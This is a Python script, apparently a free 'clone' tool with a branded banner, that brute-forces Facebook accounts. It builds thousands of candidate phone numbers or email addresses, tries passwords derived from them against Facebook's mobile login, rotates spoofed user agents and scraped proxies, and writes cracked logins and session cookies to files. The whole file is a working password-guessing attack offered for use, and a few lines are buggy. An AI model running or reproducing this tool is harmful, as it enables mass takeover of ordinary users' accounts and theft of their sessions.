#Sc Make By Asraful Islam Hasan
#Gift By Hasan
#Github= KgHasan

import os,sys,time,json,random,re,string,platform,base64,uuid,marshal
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]



try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    
logo = ("""\033[1;92m
<━━━━━━━━━━━━━━━━━◆😈◆━━━━━━━━━━━━━━━━━━>

    _________   __ _________  __  ____ 
    /_  __/ _ | / // / __/ _ \/ / / / / 
     / / / __ |/ _  / _// // / /_/ / /__
    /_/ /_/ |_/_//_/___/____/\____/____/

<━━━━━━━━━━━━━━━━━━◆😈◆━━━━━━━━━━━━━━━━━━>
\033[1;91m<═══\033[1;41m\033[1;97m 🥰𝐖𝐄𝐋𝐎𝐂𝐌𝐄 𝐓𝐎 𝐓𝐀𝐇𝐄𝐃𝐔𝐋 𝐓𝐎𝐎𝐋𝐒🥰\033[;0m\033[1;91m═══>\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[-] 𝐓𝐎𝐎𝐋𝐒 𝐓𝐘𝐏𝐄:\033[1;32m FREE
\033[1;32m[-] 𝐕𝐄𝐑𝐒𝐈𝐎𝐍   :\033[1;32m 0.9
\033[1;32m[-] 𝐀𝐔𝐓𝐇𝐎𝐑    :\033[1;32m 𝐆𝐅𝐗 𝐓𝐀𝐇𝐄𝐃𝐔𝐋 
\033[1;32m[-] 𝐆𝐈𝐓𝐇𝐔𝐁    :\033[1;32m 𝐓𝐀𝐇𝐄𝐃𝐔𝐋-4𝐗
\033[1;32m[-] 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊  :\033[1;32m ƬƛӇЄƊƲԼ ヽ・　T.T
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m 😈𝐓𝐇𝐈𝐒 𝐍𝐀𝐌𝐄 𝐈𝐒 𝐓𝐀𝐇𝐄𝐃𝐔𝐋 𝐁𝐑𝐀𝐍𝐃😈\033[;0m\033[1;91m═══>\033[1;92m""")

class Ifty:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print(" [1] Random Uid+Num Clone")
        print(" [2] Random Gmail Clone ")
        print(" [3] Contact Admin")
        print(" [0] Exit")
        Ornita =input(" [?] Choose : ")
        if Ornita in ["1", "01"]:
            asha()
        if Ornita in ["2","02"]:
            naima()
        if Ornita in [" 3", "03"]:
        	os.system('xdg-open https://www.facebook.com/Broken.8967?mibextid=ZbWKwL')
        if Ornita in [" 0", "00"]:
            exit()
        else:
            exit()
def asha():
    user=[]
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 017, 018, 019, 016, 013, 014 ')
    kode = input(' [?] Choice Sim code: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    limit = int(input(' [?] Clone Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as raifa:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[+] Total id:\033[1;92m '+tl)
        print('[+] Save As /sdcard/︎︎︎︎︎︎𝐓𝐀𝐇𝐄𝐃𝐔𝐋-ok.txt')
        print('[!] Save As /Sdacrd/︎︎︎︎︎︎𝐓𝐀𝐇𝐄𝐃𝐔𝐋-cp.txt')
        print('[!] Use flight mode for speed up ')
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
            raifa.submit(sabina,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in ok.txt,cp.txt')

def naima():
    user=[]
    os.system('clear')
    print(logo)
    kode = input(' [?] Target fast name : ')
    os.system('clear')
    print(logo)
    kodex = input(' [?] Target last name :  ')
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : @gmail.com, @yahoo.com ')
    doamin = input(' [?] Terget doamin : ')
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    limit = int(input('[?] Clone Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as raifa:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[+] Total ids:\033[1;92m '+tl)
        print('[+] Save As /sdcard/ƬƛӇЄƊƲԼ-ok.txt')
        print('[!] Save As /Sdacrd/ƬƛӇЄƊƲԼ-cp.txt')
        print('[!] Use flight mode for speed up ')
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            raifa.submit(sabina,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in ok.txt,cp.txt')
def sabina(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write(f'\r\033[m[︎︎︎︎︎︎𝐓𝐀𝐇𝐄𝐃𝐔𝐋] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://x.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'x.facebook.com',
           'method': 'GET',
           'schem': 'https',
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
           'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
           'cache-control': 'max-age=0',
           # 'cookie': 'datr=LkpPZM9x5mwg7SfLsw_7YJib; sb=LkpPZBduYeTzMfp3wA8brf3y; m_pixel_ratio=1.75; wd=412x785; fr=0TIEoge5joBeZzNgw..BkT0ou.pO.AAA.0.0.BkT1ku.AWXqRBUNRjA',
           'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
           'sec-ch-ua-mobile': '?1',
           'sec-ch-ua-platform': '"Android"',
           'sec-fetch-dest': 'document',
           'sec-fetch-mode': 'navigate',
           'sec-fetch-site': 'none',
           'sec-fetch-user': '?1',
           'upgrade-insecure-requests': '1',
           'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
}
            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"[NUMBAR] =  {uid}")
                print(f"[UID] = {cid}")
                print(f"[PASSWORD] = {ps}")
                print(f"[COOKIE] = {coki}")
                open('/sdcard/︎︎︎︎︎︎𝐓𝐀𝐇𝐄𝐃𝐔𝐋-ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"[NUMBAR] =  {uid}")
                print(f"[UID] = {ids}")
                print(f"[PASSWORD] = {ps}")
                print(f"[COOKIE] = {coki}")
                open('/sdcard/︎︎︎︎︎︎𝐓𝐀𝐇𝐄𝐃𝐔𝐋-cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[︎︎︎︎︎︎𝐓𝐀𝐇𝐄𝐃𝐔𝐋] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Ifty()
